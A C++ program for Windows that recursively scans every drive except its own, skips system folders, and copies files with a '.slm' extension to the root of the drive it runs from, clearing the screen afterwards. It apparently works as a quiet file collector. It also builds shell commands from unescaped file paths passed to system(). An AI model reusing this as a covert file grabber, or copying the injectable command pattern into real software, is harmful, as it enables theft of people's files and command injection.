/**
 *      scanning all drives and copy target files
 *      what used in it:
 *          dirent.h
 *              Dir*
 *              struct dirent
 *              opendir()
 *              closedir()
 *              readdir()
 *          sprintf()
 *          strstr()
 *          strcat(dest,src) The terminating character at the end of dest is replaced by the first character of src
 *                           va age badesh chizi to hafeze bashe onaram beham mirize
 *          recursive function
 *          system()
 *          GetModuleFileName
 *          _exit(10)
 *
 */


#include <string>
#include <iostream>
#include <cstring>
#include <dirent.h>
#include <sstream>
#include <windows.h>

using namespace std;

/* sep is using for insert space before each branch */
int sep=-1;


/* walkdir walking to all directories */
void walkdir(char * path, char runPath){

    /* define two required */
    DIR *dir;
    struct dirent *ent;

    /* check and open a directory and assign it to dir */
    if ((dir = opendir (path)) != NULL) {

        /* print all the files and directories within directory */
        /* addition 1 to sep */
//        sep++;


        /* readdir reads every files and folders in dir until it become null*/
        while ((ent = readdir (dir)) != NULL ) {


            /* . and .. used for this and parent directory so we filter these here*/
            if(*(ent->d_name)=='.'
               || strstr(ent->d_name,"Windows")
               || strstr(ent->d_name,"Program")
               || strstr(ent->d_name,"Temp")
               || strstr(ent->d_name,"temp")
               || strstr(ent->d_name,"Data")
               || strstr(ent->d_name,"App")
               || strstr(ent->d_name,"Visual")
               || strstr(ent->d_name,"windows"))
                continue;


            /*
            // first print (sep) space
            for(int i =0 ; i<=sep;i++)
                printf("  ");

            // we can get only name (nether type nor size)of files or folders by ent->d_name
            printf ("%s\n",ent->d_name);
            */


            /* here we make address for each ent->d_name */
            char  newPath[2000];
            sprintf(newPath,"%s\\%s",path,ent->d_name);

            /* and here we call walkdir for each address */
            walkdir(newPath,runPath);
        }

        /* after while for a dir we decrease sep and close dir*/
        sep--;
        closedir (dir);

    } else {
        /* could not open directory so its a file or a folder that cant be opened */

        /* and now we write a function to copy our files */
        if (strstr(path,".slm")){
            char  copy_cmd[2000] ;

            /* name may contains space so we should put it between "" */
            sprintf(copy_cmd,"copy \"%s\" %c:\\",path,runPath);
            system(copy_cmd);
            system("cls");

        }

    }
}
int main()
{

    /* by 3 line below we get the root directory */
    /* and save it to runPath */
    char runPath;
    char result[ MAX_PATH ];
    runPath = string( result, GetModuleFileName( NULL, result, MAX_PATH ) ).front();


    /* run walkdir for every directories */
    /* from one drive up to drive c */

    for(char i=runPath+1;i>=67;i--) {
        if (i==runPath)
            continue;
        char path[2];
        sprintf(path,"%c:",i);
        walkdir(path, runPath);
    }

    _exit(10);
}